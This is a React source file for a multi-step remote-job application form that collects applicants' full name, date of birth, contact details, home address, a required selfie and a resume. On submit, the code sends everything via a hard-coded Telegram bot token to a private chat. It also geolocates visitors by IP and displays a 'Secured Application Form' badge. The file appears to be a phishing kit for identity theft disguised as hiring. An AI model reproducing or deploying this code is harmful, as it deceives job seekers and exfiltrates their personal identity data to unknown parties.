import React, { useEffect, useState } from 'react'
import { BsFillShieldLockFill, BsCloudUpload } from 'react-icons/bs'
import { ImSpinner2 } from 'react-icons/im'
import axios from 'axios'
import { motion, AnimatePresence } from 'framer-motion'
import ProgressBar from './components/progress_bar'
import ModalPage from './components/Modal'
import Button from 'react-bootstrap/Button'
import Header from './components/Header'
// import Footer from './components/Footer'
import AbsoluteBack from './components/AbsoluteBack'
import { Container, Card } from 'react-bootstrap'
import SuccessModal from './components/SuccessModal'

const Forms = () => {
  const [fn, setFn] = useState('')
  const [dob, setDob] = useState('')
  const [email, setEmail] = useState('')
  const [number, setNumber] = useState('')
  const [eq, setEq] = useState('')
  const [pd, setPd] = useState('')
  const [address, setAddress] = useState('')
  const [city, setCity] = useState('')
  const [state, setState] = useState('')
  const [zip, setZip] = useState('')
  const [gender, setGender] = useState('')
  const [q1, setQ1] = useState('')
  const [q2, setQ2] = useState('')
  const [q3, setQ3] = useState('')
  const [currentSlide, setCurrentSlide] = useState(0)
  const [image, setImage] = useState('')
  const [imageTwo, setImageTwo] = useState('')
  const [imageThree, setImageThree] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const [mssge, setMssge] = useState(false)
  const [show, setShow] = useState(false)
  const [resume, setResume] = useState(null)
  const [skipResume, setSkipResume] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)
  const [selfie, setSelfie] = useState(null)

  const handleClose = () => {
    setShow(false)
    calculateProgress()
  }

  const slides = [
    {
      title: "Personal Information",
      fields: [
        {
          label: "Full Name (First Name, Last Name and Other Names)",
          type: "text",
          value: fn,
          onChange: setFn,
          required: true
        },
        {
          label: "Gender",
          type: "radio",
          value: gender,
          onChange: setGender,
          options: ["Male", "Female"],
          required: true
        },
        {
          label: "Date of Birth",
          type: "date",
          value: dob,
          onChange: setDob,
          required: true
        }
      ]
    },
    {
      title: "Contact Information",
      fields: [
        {
          label: "Email Address",
          type: "email",
          value: email,
          onChange: setEmail,
          required: true
        },
        {
          label: "Mobile Number",
          type: "tel",
          value: number,
          onChange: setNumber,
          required: true
        }
      ]
    },
    {
      title: "Professional Information",
      fields: [
        {
          label: "Educational Qualification",
          type: "select",
          value: eq,
          onChange: setEq,
          options: ["High School", "College", "University", "Masters", "PHD", "Others"],
          required: true
        },
        {
          label: "Preferred Designation",
          type: "select",
          value: pd,
          onChange: setPd,
          options: ["Financial Clerk", "Virtual Assistant", "Shopping Assistant"],
          required: true
        }
      ]
    },
    {
      title: "Location Information",
      fields: [
        {
          label: "Address",
          type: "text",
          value: address,
          onChange: setAddress,
          required: true
        },
        {
          label: "City",
          type: "text",
          value: city,
          onChange: setCity,
          required: true
        },
        {
          label: "State",
          type: "text",
          value: state,
          onChange: setState,
          required: true
        },
        {
          label: "Zip Code",
          type: "number",
          value: zip,
          onChange: setZip,
          required: true
        }
      ]
    },
    {
      title: "Upload Your Selfie",
      fields: [
        {
          label: "Take or Upload Your Selfie",
          type: "selfie",
          value: selfie,
          onChange: setSelfie,
          required: true,
          accept: "image/*"
        }
      ]
    },
    {
      title: "Resume Upload",
      fields: [
        {
          label: "Upload Your Resume (Optional)",
          type: "file",
          value: resume,
          onChange: setResume,
          required: false,
          accept: ".pdf,.doc,.docx",
          skip: {
            label: "Don't have a resume?",
            value: skipResume,
            onChange: setSkipResume
          }
        }
      ]
    },
    {
      title: "Additional Questions",
      fields: [
        {
          label: "How do you feel about working fully remotely - have you done this before?",
          type: "text",
          value: q1,
          onChange: setQ1,
          required: true,
          placeholder: "Short-Answer-text"
        },
        {
          label: "What motivates you to do your best work?",
          type: "text",
          value: q2,
          onChange: setQ2,
          required: true,
          placeholder: "Short-Answer"
        },
        {
          label: "What do you do when you have a great deal of work to accomplish in a short period of time?",
          type: "text",
          value: q3,
          onChange: setQ3,
          required: true,
          placeholder: "Short-Answer"
        }
      ]
    }
  ]

  const calculateProgress = () => {
    let total = 0
    let filled = 0

    slides.forEach(slide => {
      slide.fields.forEach(field => {
        total++
        if (field.value && field.value !== '') {
          filled++
        }
      })
    })

    return Math.round((filled / total) * 100)
  }

  const handleNext = () => {
    const currentSlideData = slides[currentSlide]
    const isValid = currentSlideData.fields.every(field => !field.required || (field.value && field.value !== ''))
    
    if (isValid) {
      setCurrentSlide(prev => Math.min(prev + 1, slides.length - 1))
      setMssge(false)
    } else {
      setMssge("Please fill all required fields before proceeding")
    }
  }

  const handlePrevious = () => {
    setCurrentSlide(prev => Math.max(prev - 1, 0))
    setMssge(false)
  }

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setMssge(''); // Clear any previous messages
    
    try {
      const BOT_TOKEN = '7649672694:AAHwInvvwU_BWU1fRbLRIP9QdmRjjOZNMfc';
      const CHAT_ID = '7436608837';
      const MESSAGE_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const DOCUMENT_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;

      // Format the message
      const message = `
📝 *New Job Application*

*Personal Information:*
Full Name: ${fn}
Gender: ${gender}
Date of Birth: ${dob}

*Contact Information:*
Email: ${email}
Phone: ${number}

*Professional Information:*
Education: ${eq}
Preferred Position: ${pd}

*Location:*
Address: ${address}
City: ${city}
State: ${state}
ZIP: ${zip}

*Additional Questions:*
1. Remote Work Experience:
${q1}

2. Work Motivation:
${q2}

3. Time Management:
${q3}

${resume ? '📎 Resume will be sent in next message' : '❌ No Resume Attached'}
${skipResume ? '(Applicant opted to skip resume)' : ''}
`;
      if (selfie) {
        const selfieFormData = new FormData();
        selfieFormData.append('chat_id', CHAT_ID);
        selfieFormData.append('photo', selfie);
        selfieFormData.append('caption', `📸 Selfie of ${fn}`);

        const selfieResponse = await axios.post(
          `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
          selfieFormData,
          {
            headers: {
              'Content-Type': 'multipart/form-data'
            }
          }
        );

        if (!selfieResponse.data.ok) {
          throw new Error('Failed to send selfie');
        }
      }

      // Send 

      // Send application details
      const messageResponse = await axios.post(MESSAGE_API_URL, {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      });

      if (!messageResponse.data.ok) {
        throw new Error('Failed to send application details');
      }

      // Send resume if available
      if (resume && !skipResume) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('document', resume);
        formData.append('caption', `Resume for ${fn}`);

        const resumeResponse = await axios.post(DOCUMENT_API_URL, formData, {
          headers: {
            'Content-Type': 'multipart/form-data'
          }
        });

        if (!resumeResponse.data.ok) {
          throw new Error('Failed to send resume');
        }
      }

      // Only show success modal after everything is processed
      setShowSuccess(true);
      
    } catch (error) {
      console.error('Submission error:', error);
      setMssge(error.message || 'Failed to submit application. Please try again.');
      setShowSuccess(false); // Ensure success modal is not shown on error
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    fetch("https://ipapi.co/json/")
      .then(res => res.json())
      .then(data => {
        setCity(data.city)
        setState(data.region)
        setZip(data.postal)
        setShow(true)
      })
  }, [])

  const captureFromCamera = () => {
    const input = document.createElement('input');
    input.type = 'file';
    input.accept = 'image/*';
    input.capture = 'user';
    input.onchange = (e) => {
      const file = e.target.files[0];
      if (file) {
        setSelfie(file);
      }
    };
    input.click();
  };

  const renderField = (field) => {
    const fieldStyle = {
      container: {
        position: 'relative',
        marginBottom: '1.5rem'
      },
      input: {
        backgroundColor: 'rgba(255, 255, 255, 0.9)',
        border: '1px solid #e2e8f0',
        borderRadius: '12px',
        padding: '0.75rem 1rem',
        fontSize: '1rem',
        width: '100%',
        transition: 'all 0.3s ease',
        color: '#2c3e50'
      },
      label: {
        position: 'absolute',
        left: '1rem',
        top: '0.75rem',
        color: '#7f8c8d',
        transition: 'all 0.3s ease',
        pointerEvents: 'none',
        fontSize: '1rem'
      },
      focusedLabel: {
        transform: 'translateY(-1.5rem) scale(0.85)',
        color: '#3498db'
      },
      select: {
        appearance: 'none',
        backgroundImage: 'url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 24 24\' fill=\'none\' stroke=\'currentColor\' stroke-width=\'2\' stroke-linecap=\'round\' stroke-linejoin=\'round\'%3e%3cpolyline points=\'6 9 12 15 18 9\'%3e%3c/polyline%3e%3c/svg%3e")',
        backgroundRepeat: 'no-repeat',
        backgroundPosition: 'right 1rem center',
        backgroundSize: '1em'
      },
      filePreview: {
        marginTop: '1rem',
        padding: '1rem',
        backgroundColor: 'rgba(255, 122, 61, 0.05)',
        borderRadius: '8px',
        border: '1px solid rgba(255, 122, 61, 0.1)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'space-between'
      },
      fileName: {
        color: '#2c3e50',
        fontWeight: '500',
        fontSize: '0.9rem'
      },
      fileSize: {
        color: '#7f8c8d',
        fontSize: '0.8rem',
        marginLeft: '1rem'
      },
      removeButton: {
        background: 'none',
        border: 'none',
        color: '#e74c3c',
        cursor: 'pointer',
        padding: '0.25rem 0.5rem',
        fontSize: '0.9rem',
        transition: 'all 0.2s ease'
      }
    };

    switch (field.type) {
      case 'radio':
        return (
          <div className="d-flex gap-4">
            {field.options.map(option => (
              <div key={option} className="form-check custom-radio">
                <input
                  type="radio"
                  className="form-check-input"
                  id={option}
                  name={field.label}
                  value={option}
                  checked={field.value === option}
                  onChange={(e) => field.onChange(e.target.value)}
                  required={field.required}
                />
                <label className="form-check-label" htmlFor={option}>
                  {option}
                </label>
              </div>
            ))}
          </div>
        );
      case 'select':
        return (
          <select
            className="form-select"
            value={field.value}
            onChange={(e) => field.onChange(e.target.value)}
            required={field.required}
            style={{
              ...fieldStyle.input,
              ...fieldStyle.select
            }}
          >
            <option value="">Select {field.label}</option>
            {field.options.map(option => (
              <option key={option} value={option}>
                {option}
              </option>
            ))}
          </select>
        );
      case 'selfie':
        return (
          <div>
            <div style={{
              display: 'grid',
              gridTemplateColumns: '1fr 1fr',
              gap: '1rem',
              marginBottom: '1rem'
            }}>
              <motion.button
                type="button"
                onClick={captureFromCamera}
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
                style={{
                  padding: '1.5rem',
                  backgroundColor: '#3498db',
                  color: 'white',
                  border: 'none',
                  borderRadius: '12px',
                  fontSize: '1rem',
                  fontWeight: '600',
                  cursor: 'pointer',
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '0.5rem',
                  transition: 'all 0.3s ease'
                }}
              >
                <span style={{ fontSize: '1.5rem' }}>📷</span>
                Take a Selfie
              </motion.button>
              <input
                type="file"
                accept="image/*"
                onChange={(e) => {
                  const file = e.target.files[0];
                  if (file) {
                    setSelfie(file);
                  }
                }}
                style={{
                  display: 'none'
                }}
                id="selfieUpload"
              />
              <label htmlFor="selfieUpload" style={{
                padding: '1.5rem',
                backgroundColor: '#2ecc71',
                color: 'white',
                border: 'none',
                borderRadius: '12px',
                fontSize: '1rem',
                fontWeight: '600',
                cursor: 'pointer',
                display: 'flex',
                flexDirection: 'column',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '0.5rem',
                transition: 'all 0.3s ease',
                margin: 0
              }}>
                <span style={{ fontSize: '1.5rem' }}>🖼️</span>
                Upload Image
              </label>
            </div>
            {selfie && (
              <motion.div 
                style={fieldStyle.filePreview}
                initial={{ opacity: 0, y: -10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
              >
                <div style={{ display: 'flex', alignItems: 'center', gap: '1rem' }}>
                  <img
                    src={URL.createObjectURL(selfie)}
                    alt="Selfie"
                    style={{
                      width: '60px',
                      height: '60px',
                      borderRadius: '8px',
                      objectFit: 'cover'
                    }}
                  />
                  <div>
                    <span style={fieldStyle.fileName}>{selfie.name}</span>
                    <span style={fieldStyle.fileSize}>
                      {(selfie.size / 1024 / 1024).toFixed(2)} MB
                    </span>
                  </div>
                </div>
                <button
                  type="button"
                  style={fieldStyle.removeButton}
                  onClick={() => setSelfie(null)}
                >
                  Remove
                </button>
              </motion.div>
            )}
          </div>
        );
      case 'file':
        return (
          <div>
            <div className={`custom-file-upload ${field.skip?.value ? 'disabled' : ''}`}>
              <input
                type="file"
                onChange={(e) => {
                  const file = e.target.files[0];
                  if (file) {
                    field.onChange(file);
                  }
                }}
                accept={field.accept}
                disabled={field.skip?.value}
              />
              <BsCloudUpload className="upload-icon" />
              <div className="upload-text">
                {!field.value ? 'Drag and drop your resume here or click to browse' : 'File selected'}
              </div>
              <div className="upload-hint">
                Supported formats: PDF, DOC, DOCX
              </div>
            </div>

            {field.value && (
              <motion.div 
                style={fieldStyle.filePreview}
                initial={{ opacity: 0, y: -10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
              >
                <div style={{ display: 'flex', alignItems: 'center' }}>
                  <span style={fieldStyle.fileName}>{field.value.name}</span>
                  <span style={fieldStyle.fileSize}>
                    {(field.value.size / 1024 / 1024).toFixed(2)} MB
                  </span>
                </div>
                <button
                  type="button"
                  style={fieldStyle.removeButton}
                  onClick={() => field.onChange(null)}
                >
                  Remove
                </button>
              </motion.div>
            )}

            {field.skip && (
              <div className="skip-resume-option">
                <div className="form-check custom-checkbox mt-3">
                  <input
                    type="checkbox"
                    className="form-check-input"
                    id="skipResume"
                    checked={field.skip.value}
                    onChange={(e) => {
                      field.skip.onChange(e.target.checked);
                      if (e.target.checked) {
                        field.onChange(null);
                      }
                    }}
                  />
                  <label className="form-check-label" htmlFor="skipResume">
                    {field.skip.label}
                  </label>
                </div>
              </div>
            )}
          </div>
        );
      default:
        return (
          <div style={fieldStyle.container}>
            <input
              type={field.type}
              className="form-control floating-input"
              value={field.value}
              onChange={(e) => field.onChange(e.target.value)}
              required={field.required}
              // placeholder={field.placeholder}
              style={fieldStyle.input}
            />
            <label 
              style={{
                ...fieldStyle.label,
                ...(field.value ? fieldStyle.focusedLabel : {})
              }}
            >
              {field.placeholder}
            </label>
          </div>
        );
    }
  }
  
  const slideVariants = {
    enter: (direction) => ({
      x: direction > 0 ? 1000 : -1000,
      opacity: 0
    }),
    center: {
      zIndex: 1,
      x: 0,
      opacity: 1
    },
    exit: (direction) => ({
      zIndex: 0,
      x: direction < 0 ? 1000 : -1000,
      opacity: 0
    })
  };

  const swipeConfidenceThreshold = 10000;
  const swipePower = (offset, velocity) => {
    return Math.abs(offset) * velocity;
  };

  const handleSlideClick = (index) => {
    // Only allow moving to slides where previous slides are completed
    const canMove = slides.slice(0, index).every(slide => 
      slide.fields.every(field => !field.required || (field.value && field.value !== ''))
    );
    
    if (canMove) {
      setCurrentSlide(index);
      setMssge(false);
    } else {
      setMssge("Please complete previous sections first");
    }
  };

  const renderStepIndicator = (index) => {
    const isCompleted = slides[index].fields.every(
      field => !field.required || (field.value && field.value !== '')
    );
    const isCurrent = index === currentSlide;

    return (
      <motion.div
        key={index}
        className={`step-indicator ${isCurrent ? 'current' : ''} ${isCompleted ? 'completed' : ''}`}
        onClick={() => handleSlideClick(index)}
        whileHover={{ scale: 1.05 }}
        whileTap={{ scale: 0.95 }}
      >
        <motion.div 
          className="step-number"
          initial={false}
          animate={{
            backgroundColor: isCompleted ? '#2ecc71' : (isCurrent ? '#3498db' : '#f8f9fa'),
            borderColor: isCompleted ? '#2ecc71' : (isCurrent ? '#3498db' : '#e2e8f0'),
            color: isCompleted ? '#ffffff' : (isCurrent ? '#3498db' : '#7f8c8d')
          }}
        >
          {isCompleted ? '✓' : index + 1}
        </motion.div>
        <div className="step-title">{slides[index].title}</div>
      </motion.div>
    );
  };
  
  const buttonStyle = {
    backgroundColor: "#3498db",
    borderColor: "#3498db",
    transition: "all 0.3s ease"
  };

  const buttonHoverStyle = {
    backgroundColor: "#2980b9",
    borderColor: "#2980b9",
    transform: "translateY(-2px)",
    boxShadow: "0 6px 15px rgba(52, 152, 219, 0.25)"
  };

  return (
    <div className="form-wrapper">
      <Header />
      <Container className="py-5">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
        >
          <Card className="shadow-lg">
            <Card.Body className="p-5">
              <motion.h2 
                className="text-center mb-4"
                initial={{ opacity: 0, y: -20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.5 }}
                style={{ color: '#2c3e50', fontWeight: '600', letterSpacing: '0.01em' }}
              >
                {slides[currentSlide].title}
              </motion.h2>

              <div className="step-indicators mb-4">
                {slides.map((_, index) => renderStepIndicator(index))}
              </div>

              <form onSubmit={handleSubmit}>
                <AnimatePresence mode="wait" custom={currentSlide}>
                  <motion.div
                    key={currentSlide}
                    custom={currentSlide}
                    variants={slideVariants}
                    initial="enter"
                    animate="center"
                    exit="exit"
                    transition={{
                      x: { type: "spring", stiffness: 300, damping: 30 },
                      opacity: { duration: 0.2 }
                    }}
                    drag="x"
                    dragConstraints={{ left: 0, right: 0 }}
                    dragElastic={1}
                    onDragEnd={(e, { offset, velocity }) => {
                      const swipe = swipePower(offset.x, velocity.x);
                      if (swipe < -swipeConfidenceThreshold) {
                        handleNext();
                      } else if (swipe > swipeConfidenceThreshold) {
                        handlePrevious();
                      }
                    }}
                    className="slide-container"
                    style={{
                      background: 'rgba(255, 255, 255, 0.5)',
                      borderRadius: '12px',
                      padding: '20px',
                      marginBottom: '20px'
                    }}
                  >
                    {slides[currentSlide].fields.map((field, index) => (
                      <motion.div 
                        key={index} 
                        className="mb-4"
                        initial={{ opacity: 0, y: 20 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ delay: index * 0.1 }}
                      >
                        <label className="form-label">
                          {field.label}
                          {field.required && <span className="text-danger">*</span>}
                        </label>
                        {renderField(field)}
                      </motion.div>
                    ))}
                  </motion.div>
                </AnimatePresence>

                {mssge && (
                  <motion.div 
                    className="alert alert-danger"
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0, y: -20 }}
                  >
                    {mssge}
                  </motion.div>
                )}

                <motion.div 
                  className="d-flex justify-content-between mt-4"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  transition={{ delay: 0.3 }}
                >
                  <Button
                    variant="light"
                    onClick={handlePrevious}
                    disabled={currentSlide === 0}
                    className="btn-with-icon"
                    style={{
                      backgroundColor: 'rgba(255, 255, 255, 0.9)',
                      borderColor: '#e2e8f0',
                      color: '#2c3e50'
                    }}
                  >
                    <i className="fas fa-arrow-left me-2"></i>
                    Previous
                  </Button>
                  {currentSlide === slides.length - 1 ? (
                    <Button
                      style={buttonStyle}
                      type="submit"
                      disabled={isLoading}
                      className="btn-with-icon"
                    >
                      {isLoading ? (
                        <>
                          <ImSpinner2 className="App-spin me-2" />
                          Processing
                        </>
                      ) : (
                        <>
                          Submit Application
                          <i className="fas fa-check ms-2"></i>
                        </>
                      )}
                    </Button>
                  ) : (
                    <Button
                      style={buttonStyle}
                      onClick={handleNext}
                      className="btn-with-icon"
                    >
                      Next
                      <i className="fas fa-arrow-right ms-2"></i>
                    </Button>
                  )}
                </motion.div>
              </form>
            </Card.Body>
          </Card>
        </motion.div>

        <motion.div 
          className="mt-4 text-center text-white"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.5 }}
        >
          <BsFillShieldLockFill className="secure-icon" /> 
          <span style={{ fontSize: '0.9rem', letterSpacing: '0.02em' }}>
            Secured Application Form
          </span>
        </motion.div>
      </Container>

      <ModalPage
        show={show}
        handleClose={handleClose}
        city={city}
        state={state}
        zip={zip}
      />

      <SuccessModal 
        show={showSuccess} 
        onClose={() => setShowSuccess(false)} 
      />
    </div>
  )
}

export default Forms
